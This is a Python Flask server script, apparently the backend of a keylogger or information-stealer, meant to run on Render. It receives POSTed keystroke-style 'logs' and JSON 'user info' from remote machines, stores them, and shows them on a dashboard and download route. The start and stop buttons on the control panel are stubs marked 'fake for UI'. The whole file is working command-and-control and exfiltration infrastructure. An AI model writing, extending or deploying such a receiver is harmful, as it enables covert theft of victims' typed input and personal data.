# remote.py → hosted on Render as `app.py`
from flask import Flask, request, render_template_string, jsonify, send_file
import os
import json
from datetime import datetime

app = Flask(__name__)
LOG_DIR = "received_logs"
USERINFO_DIR = "userinfo_logs"
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(USERINFO_DIR, exist_ok=True)

# --- HTML Template (exactly your original one) ---
CONTROL_PANEL_HTML = """..."""  # keep your existing long HTML exactly as it is

# 🧠 Replace JS fetch('/people') with fetch('/latestlog')
# ⬆️ Just change one line in your HTML script section:
# OLD:
# fetch("/people?nocache=" + unique)
# NEW:
# fetch("/latestlog?nocache=" + unique)

@app.route('/')
def home():
    return render_template_string(CONTROL_PANEL_HTML)

@app.route('/start', methods=['POST'])
def start(): return '', 200  # fake for UI

@app.route('/stop', methods=['POST'])
def stop(): return '', 200

@app.route('/reload', methods=['POST'])
def reload():
    for f in os.listdir(LOG_DIR):
        os.remove(os.path.join(LOG_DIR, f))
    return '', 200

@app.route('/latestlog')
def latestlog():
    try:
        files = sorted(os.listdir(LOG_DIR), reverse=True)
        if not files:
            return "[No log files yet]", 200
        with open(os.path.join(LOG_DIR, files[0]), "r", encoding="utf-8") as f:
            return f.read(), 200
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/download')
def download():
    files = sorted(os.listdir(LOG_DIR), reverse=True)
    if not files:
        return "No logs available", 404
    filepath = os.path.join(LOG_DIR, files[0])
    return send_file(filepath, as_attachment=True)

@app.route('/log', methods=['POST'])
def receive_log():
    data = request.form.get("log", "")
    filename = f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(os.path.join(LOG_DIR, filename), 'w', encoding='utf-8') as f:
        f.write(data)
    print(f"[✓] Log saved: {filename}")
    return 'OK', 200

@app.route('/userinfoo', methods=['POST'])
def receive_userinfo():
    data = request.json
    filename = f"user_info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(os.path.join(USERINFO_DIR, filename), 'w') as f:
        json.dump(data, f, indent=4)
    return jsonify({"status": "success"}), 200

@app.route('/userinfo')
def userinfo_dashboard():
    all_data = []
    for filename in sorted(os.listdir(USERINFO_DIR)):
        filepath = os.path.join(USERINFO_DIR, filename)
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
                all_data.append(data)
        except:
            continue
    if not all_data:
        return "<h2>No user info collected yet.</h2>"
    return render_template_string("""<html><body><h2>User Info</h2>
    <table border=1><tr>{% for key in all_data[0].keys() %}<th>{{ key }}</th>{% endfor %}</tr>
    {% for row in all_data %}<tr>{% for val in row.values() %}<td>{{ val }}</td>{% endfor %}</tr>{% endfor %}
    </table></body></html>""", all_data=all_data)


if __name__ == '__main__':
    import os
    print("Server is starting...")
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
